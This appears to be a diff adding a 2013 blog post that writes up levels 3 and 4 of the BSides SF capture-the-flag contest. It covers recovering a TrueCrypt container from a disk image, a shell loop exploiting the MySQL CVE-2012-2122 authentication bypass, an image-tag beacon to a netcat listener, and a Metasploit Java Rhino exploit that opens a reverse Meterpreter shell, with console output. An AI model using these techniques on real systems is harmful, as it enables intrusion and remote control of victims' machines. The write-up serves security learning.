@@ -1,0 +1,76 @@
+---
+layout: post
+title: "BSides SF CTF by MAD Security, Part 2"
+date: 2013-03-03 00:43:10 +0000
+permalink: /blog/bsides-sf-ctf-by-mad-security-part-2/
+category: Security
+tags: CTF,BSides
+---
+<p>This is a continuation of my <a href="/blog/2013/03/02/bsides-sf-ctf-mad-security-part-1">write-up of the BSides SF 2013 CTF</a>.</p>
+<p><strong>Level 3: Disk Forensics</strong><br />
+	A professional cleaner who has done some work for Nick provides you with an image of a flash drive, and you're to find the most "interesting file" on the drive and provide its md5sum.  The first thing I do is run <tt>file</tt> on the image to get an idea of what we're working with:</p>
+<pre>
+$ file usb_disk_image 
+usb_disk_image: x86 boot sector, code offset 0x52, OEM-ID "NTFS    ", sectors/cluster 8, reserved sectors 0, Media descriptor 0xf8, heads 64, hidden sectors 2048, dos &lt; 4.0 BootSector (0x80)</pre><p>OK, so it's an unpartitioned NTFS filesystem. That's something we can easily work with -- Autopsy natively supports NTFS, so I can load it up into Autopsy and get an idea of what's going on. Unfortunately, all I found in Autopsy is an empty file system with a handful of deleted files. Most of those deleted files have a size of 0 bytes, but one is exactly 5MB in size. Since that's all I found, I extract the deleted sectors in hopes that it's interesting. First, I try to submit the md5 of the extracted file, but no go, it's not interesting yet.</p>
+<p>So what is this file? <tt>file</tt> tells us its "data", which is the generic response for anything it doesn't recognize. Neither <tt>strings</tt> nor <tt>hexdump</tt> find anything interesting -- in fact, the data looks nearly perfectly random. What could be completely random? Well, it could be just random junk, (ala <tt>dd if=/dev/urandom</tt>) but since it was the only thing on the flash drive, I'm going to guess it's at least slightly meaningful. So, if it's not random but <i>appears</i> random, then it's likely the output of a strong encryption cipher. It doesn't start with our favorite "Salted__" string, so it's probably not encrypted via OpenSSL. GnuPG doesn't recognize it, so it's not OpenPGP data. It also seems a little odd to me that it's <i>exactly</i> 5MB in size. Maybe an encrypted container? Didn't that password file have an entry that started with tc? TrueCrypt perhaps?</p>
+<p>I fire up TrueCrypt, open the usb_disk_image (actually a copy), and it prompts for a password, so I give it the passphrase labeled tc: from the earlier passwords.enc file -- and the container unlocks! It contains only one file, an SSH public key file. I copy out the file, md5sum it, and submit the hash, and I'm on to level 4!</p>
+<p><strong>Level 4: Drivel</strong><br />
+	Apparently, Nick was a fan of a social network called "Drivel", and that network might have been what allowed the Absurdistani government to snoop on him. So, there's three things we'd like to do using Drivel: find out what Nick's Drivel handle is, find out the user agent of the Absurdistani snoop, and gain access to the workstation of the Absurdistani snoop.</p>
+<p>Drivel apparently has no search function, no user index, no obvious way to enumerate users. Nick's credentials from myface.com don't get me anywhere either. Create an account and poke around. Create a few posts, looking for obvious issues -- oh, hrrm, it doesn't like posts with single quotes "'" in them. I get an error of "Unable to insert data to db.drivel.com as driveldba", so first I'm thinking Blind SQL injection, but with no idea of the schema, and the fact that errors seem to be consistent, this doesn't seem to be a strong avenue.</p>
+<p>Maybe the DB server will be more fruitful. A quick nmap shows the only thing running on the machine is MySQL, specifically 5.1.58-1ubuntu3. At first, I threw a few common/obvious passwords down with users of root/driveldba, but go nowhere. Then I thought about the fact that 5.1.58 is a bit of an old version, and maybe it's vulnerable to CVE-2012-2122 (which, by the way, is possibly my favorite vuln of all time). That's easy enough to check:</p>
+<pre>
+$ while true;do mysql -udriveldba -pfoo -hdb.drivel.com;done
+ERROR 1045 (28000): Access denied for user: 'driveldba@10.10.1.99' (Using password: YES)
+ERROR 1045 (28000): Access denied for user: 'driveldba@10.10.1.99' (Using password: YES)
+ERROR 1045 (28000): Access denied for user: 'driveldba@10.10.1.99' (Using password: YES)
+...
+ERROR 1045 (28000): Access denied for user: 'driveldba@10.10.1.99' (Using password: YES)
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 132382
+Server version: 5.1.58-1ubuntu3
+mysql&gt;
+</pre><p>Nothing like "vulnerable to a shell loop" to make your day. We still need nick's info from the DB.</p>
+<pre>
+mysql&gt; use drivel;
+mysql&gt; select * from user where email='nickn@aol.com';
++-----+----------+---------------+
+| id  | username | email         |
++-----+----------+---------------+
+| 137 | wickednn | nickn@aol.com |
++-----+----------+---------------+
+1 row in set (0.00 sec)
+</pre><p>Ok, @wickednn into the scoring system and we're on to the next flag. We need the User Agent of the Absurdistani snoop. I fumbled on this one for way, way, way, too long. I was trying all kinds of stored XSS with absolutely no luck (well, at least for the Absurdistani snoop -- I'm pretty sure a couple of other competitors stumbled on to my stored XSS...) Wasting my time with trying to get the snoop to post a message containing his user agent, Josh from MAD Security saw what I was doing and said "stop overthinking." He was right -- I was overthinking. Not only could I put XSS in the posts on Drivel, I could throw some plain HTML in there. Say, HTML to request an IMG from another server. Like a server running on my laptop. Even <tt>netcat</tt>, since all I needed were headers. Not only would I get a User-Agent, but I'd get a lot more information as well. <tt>nc -l -p80</tt> and drop an IMG tag into a post to @wickednn, and then wait...</p>
+<pre>
+GET / HTTP/1.1
+Accept: image/png, image/svg+xml, image/*;q=0.8, */*;q=0.5
+Referer: http://drivel.com/p/wickednn
+Accept-Language: en-US
+User-Agent: Mozilla 5.0 (Compatible; MSIE 9.0; Windows NT 6.1; Java 1.6u25; Trident/5.0)
+Accept-Encoding: gzip, deflate
+Host: 10.10.0.148
+Connection: Keep-Alive</pre><p>As an added bonus, netstat lets me know the connection is coming from 10.1.5.51. So, I put in the User-Agent and get to figuring out how I'm going to gain access to the workstation. I spent some time looking at browser exploits, like MS13-009, but MSIE 9 is pretty current. On the other hand, Java 1.6u25 isn't so much, so I focus on getting into the client via Java. I try a few more XSS attacks to redirect to bad Java applets, but it's pretty clear that's not working -- it seems that our snoop has JS disabled in his browser. So I settle on CVE-2011-3544, which is an exploit in the Java Rhino Scripting Engine in Java 1.6 &lt; Update 27, which our client meets. It's a fairly high reliability attack and available directly from Metasploit, so it's a good starting place. But with no XSS, how will I get him to it? Clearly, an IMG tag isn't going to get MSIE to load an applet, but what about an iframe? I launch the exploit to grab the URL from my workstation.</p>
+<pre>
+msf &gt; use exploit/multi/browser/java_rhino
+msf  exploit(java_rhino) &gt; set DisablePayloadHandler false
+DisablePayloadHandler =&gt; false
+msf  exploit(java_rhino) &gt; set LPORT 13859
+LPORT =&gt; 13859
+msf  exploit(java_rhino) &gt; set SRVPORT 8080
+SRVPORT =&gt; 8080
+msf  exploit(java_rhino) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD =&gt; windows/meterpreter/reverse_tcp
+msf  exploit(java_rhino) &gt; set TARGET 1
+TARGET =&gt; 1
+msf  exploit(java_rhino) &gt; exploit -j
+[*] Exploit running as background job.
+[*] Started reverse handler on 10.10.0.148:13859 
+[*] Using URL: http://0.0.0.0:8080/mbgQ7zQ41UT
+[*]  Local IP: http://10.10.0.148:8080/mbgQ7zQ41UT
+[*] Server started.
+</pre><p>I insert an iframe into a post, pointing to my Metasploit instance (<a href="http://10.10.0.148:8080/mbgQ7zQ41UT">http://10.10.0.148:8080/mbgQ7zQ41UT</a>). And again, we're waiting on him to refresh the stream.</p>
+<pre>
+[*] 10.1.5.51        java_rhino - Java Applet Rhino Script Engine Remote Code Execution handling request
+[*] 10.1.5.51        java_rhino - Sending Applet.jar
+[*] Sending stage (752128 bytes) to 10.1.5.51
+[*] Meterpreter session 1 opened (10.10.0.148:13859 -&gt; 10.1.5.51:49417) at 2013-02-25 12:31:45 -0800</pre><p>Launch a windows shell, and there's the hostname! Into the scoring system it goes, and we're on to level 5... in the next post.</p>
+
